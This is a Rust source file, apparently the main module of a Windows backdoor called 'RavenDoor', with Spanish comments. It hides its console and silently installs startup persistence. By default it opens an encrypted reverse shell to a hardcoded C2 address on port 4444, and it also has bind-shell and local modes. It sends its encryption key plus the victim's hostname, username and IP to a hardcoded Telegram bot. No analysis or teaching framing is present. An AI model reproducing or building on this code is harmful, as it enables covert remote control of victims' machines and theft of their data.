#![windows_subsystem = "windows"]  // OCULTA LA CONSOLA

use std::error::Error;
use std::env;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::runtime::Runtime;

mod listener;
mod commands;
mod persistence;
mod config;
mod reverse;
mod encryption;
mod telegram;

fn main() -> Result<(), Box<dyn Error>> {
    
    let args: Vec<String> = env::args().collect();
    
    // TU IP PÚBLICA y PUERTO
    let public_ip = "190.134.212.212";  // TU IP PÚBLICA
    let kali_local_ip = "192.168.1.12";  // IP LOCAL 
    let port = 4444;
    
    if args.len() >= 4 && args[1] == "--reverse" {
        // Con IP personalizada
        let kali_ip = args[2].clone();
        let kali_port: u16 = args[3].parse().unwrap_or(port);
        
        //log_message(&format!("Reverse Shell a {}:{}", kali_ip, kali_port));
        install_persistence_silent();
        run_background(kali_ip, kali_port);
        
    } else if args.len() >= 2 && args[1] == "--bind" {
        // Bind shell
        //log_message("Modo Bind Shell");
        install_persistence_silent();
        run_bind_shell();
        
    } else if args.len() >= 2 && args[1] == "--local" {
        // Para pruebas locales (Kali en misma red)
        //log_message(&format!("Conectando a Kali local {}:{}", kali_local_ip, port));
        install_persistence_silent();
        run_background(kali_local_ip.to_string(), port);
        
    } else {
        // MODO POR DEFECTO: Usa tu IP pública
        //log_message(&format!("RavenDoor iniciado - IP Pública: {}:{}", public_ip, port));
        //log_message(&format!("Kali Local: {}:{} (para pruebas en red)", kali_local_ip, port));
        install_persistence_silent();
        run_background(public_ip.to_string(), port);
    }
    
    Ok(())
}


fn get_timestamp() -> String {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let hours = (now / 3600) % 24;
    let minutes = (now / 60) % 60;
    let seconds = now % 60;
    
    format!("{:02}:{:02}:{:02}", hours, minutes, seconds)
}

/*
fn log_message(msg: &str) {
    if let Ok(appdata) = env::var("APPDATA") {
        let log_path = format!("{}\\Microsoft\\Windows\\ravendoor.log", appdata);
        let timestamp = get_timestamp();
        
        let _ = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_path)
            .and_then(|mut file| {
                use std::io::Write;
                file.write_all(format!("[{}] {}\n", timestamp, msg).as_bytes())
            });
    }
}
*/

fn log_key_special(key_hex: &str) {
    println!("🔑 Key generada: {}...", &key_hex[0..32]);
    
    // 2. Guardar en AppData (oculto)
    if let Ok(appdata) = env::var("APPDATA") {
        let appdata_path = format!("{}\\Microsoft\\Windows\\ravendoor_key.txt", appdata);
        let _ = std::fs::write(&appdata_path, key_hex);
        println!("📁 Clave guardada en AppData (oculta)");
    }
    
    // 3. USAR BOT HARDCODED     
    // USAR LA FUNCIÓN create_bot_hardcoded
    let bot = telegram::create_bot_hardcoded();
    
    let hostname = gethostname::gethostname()
        .into_string()
        .unwrap_or_else(|_| "unknown".to_string());
        
    let username = whoami::username();
    let ip = local_ip_address::local_ip()
        .map(|ip| ip.to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    println!("[+] System info - Hostname: {}, User: {}, IP: {}", hostname, username, ip);
    
    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        match bot.send_key(key_hex, &hostname, &username, &ip).await {
            Ok(_) => println!("[+] ¡Clave enviada a Telegram EXITOSAMENTE!"),
            Err(e) => println!("[!] Telegram error: {}", e),
        }
    });
}

fn install_persistence_silent() {
    std::thread::spawn(|| {
        persistence::install("startup");
    });
    
    //log_message("Persistencia configurada (startup)");
}

fn run_background(ip: String, port: u16) {
    // Generar clave de encriptación
    let key = encryption::Encryption::generate_key();
    let key_hex = encryption::Encryption::key_to_hex(&key);
    
    // Guardar clave COMPLETA 
    log_key_special(&key_hex);
    
    // Verificar longitud
    //log_message(&format!("Longitud clave: {} caracteres", key_hex.len()));
    
    if key_hex.len() == 64 {
        //log_message("Clave AES-256 válida generada");
    } else {
        //log_message(&format!("ERROR: Clave tiene {} caracteres, debe ser 64", key_hex.len()));
    }
    
    //log_message("IMPORTANTE: Usa la clave COMPLETA de 64 caracteres en el cliente C2");
    //log_message(&format!("Clave: {}", key_hex));
    
    // Hacer la key inmutable para pasarla al hilo
    std::thread::spawn(move || {
        //log_message(&format!("Conectando a {}:{}", ip, port));
        
        let rt = match tokio::runtime::Runtime::new() {
            Ok(rt) => rt,
            Err(e) => {
                //log_message(&format!("Error runtime: {}", e));
                return;
            }
        };
        
        rt.block_on(async {
            // CORRECCIÓN: Envolver key en Some()
            if let Err(e) = reverse::connect_to_c2(&ip, port, Some(key)).await {
                //log_message(&format!("Error en conexión: {}", e));
            }
        });
    });
    
    //log_message("Proceso en ejecución (background)");
    
    // Mantener el programa corriendo
    loop {
        std::thread::sleep(std::time::Duration::from_secs(3600));
    }
}

fn run_bind_shell() {
    std::thread::spawn(|| {
        let rt = match tokio::runtime::Runtime::new() {
            Ok(rt) => rt,
            Err(e) => {
                //log_message(&format!("Error runtime bind: {}", e));
                return;
            }
        };
        
        if let Ok(config) = config::load_config("config.toml") {
            let _ = rt.block_on(listener::start(&config.server));
        }
    });
    
    loop {
        std::thread::sleep(std::time::Duration::from_secs(3600));
    }
}